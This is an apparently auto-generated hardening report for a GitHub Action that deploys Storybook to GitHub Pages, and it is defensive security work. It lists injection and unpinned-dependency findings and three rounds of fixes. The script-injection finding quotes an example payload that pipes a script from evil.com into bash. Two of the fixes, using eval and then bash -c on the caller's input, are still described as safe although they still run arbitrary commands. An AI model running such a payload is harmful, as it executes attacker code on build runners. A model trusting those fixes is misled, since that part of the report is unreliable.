<!-- markdownlint-disable -->

# Hardening Report: bitovi--github-actions-storybook-to-github-pages/v1.0.3

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **bitovi--github-actions-storybook-to-github-pages/v1.0.3** was hardened automatically. 4 finding(s) were identified and resolved across 3 iteration(s).

## Findings Fixed

### script-injection (severity: high)

The 'Build' step directly interpolates `${{ inputs.install_command }}` and `${{ inputs.build_command }}` inside a `run:` shell block (sub-rule a). These are caller-controlled inputs that are substituted into the shell command string by the Actions template engine before the shell ever sees them, enabling arbitrary command injection. An attacker who controls the calling workflow can supply a value like `; curl -s https://evil.com/payload | bash` to execute arbitrary code on the runner.

Locations:

- `action.yaml:38`

### unpinned-uses (severity: high)

Three `uses:` references in action.yaml pin to mutable version tags instead of immutable 40-character commit SHAs, making the action vulnerable to supply-chain attacks if the upstream tag is moved or the repository is compromised:
- `actions/checkout@v4`
- `actions/upload-pages-artifact@v3`
- `actions/deploy-pages@v4`
Each should be pinned to a full SHA digest, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`.

Locations:

- `action.yaml:32`
- `action.yaml:43`
- `action.yaml:48`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.install_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:43`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.build_command }}" appears directly in run: block of step "Build"; move to env: map

Locations:

- `action.yml:44`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses

**Notes:**

Fixed all findings in action.yaml:
1. script-injection / static-inline-injection: Moved `${{ inputs.install_command }}` and `${{ inputs.build_command }}` from the `run:` shell block into an `env:` block (as INSTALL_COMMAND and BUILD_COMMAND). The shell script now uses `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` to execute the commands safely as environment variables rather than template-substituted shell strings.
2. unpinned-uses: Pinned all three `uses:` references to full 40-character commit SHAs:
   - actions/checkout@v4 → @34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
   - actions/upload-pages-artifact@v3 → @56afc609e74202658d3ffba0e8f6dda462b719fa # v3
   - actions/deploy-pages@v4 → @d6db90164ac5ed86f2b6aed7e0febac5b3c0c03e # v4
Note: findings referenced both action.yaml and action.yml but only action.yaml exists; both finding sets referred to the same file.

### Iteration 2

**Fixes applied:** script-injection, suspicious-run-content

**Notes:**

Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with direct variable expansion `$INSTALL_COMMAND` and `$BUILD_COMMAND` in the Build step of action.yaml. The `eval` keyword was re-parsing user-controlled input as shell commands, allowing arbitrary shell injection via metacharacters. Without `eval`, bash performs word splitting but does not re-interpret shell metacharacters, preventing injection while still supporting the intended use case of running install and build commands like `npm ci` and `npm run build-storybook`.

### Iteration 3

**Fixes applied:** script-injection

**Notes:**

Fixed the unquoted $INSTALL_COMMAND and $BUILD_COMMAND expansions in the 'Build' step's run block. Changed bare `$INSTALL_COMMAND` and `$BUILD_COMMAND` to `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` respectively. The user-controlled inputs were already correctly placed in the step's `env:` block; the issue was that the variables were expanded unquoted as bare shell commands, allowing word splitting and glob expansion. The double-quoted form prevents these issues.

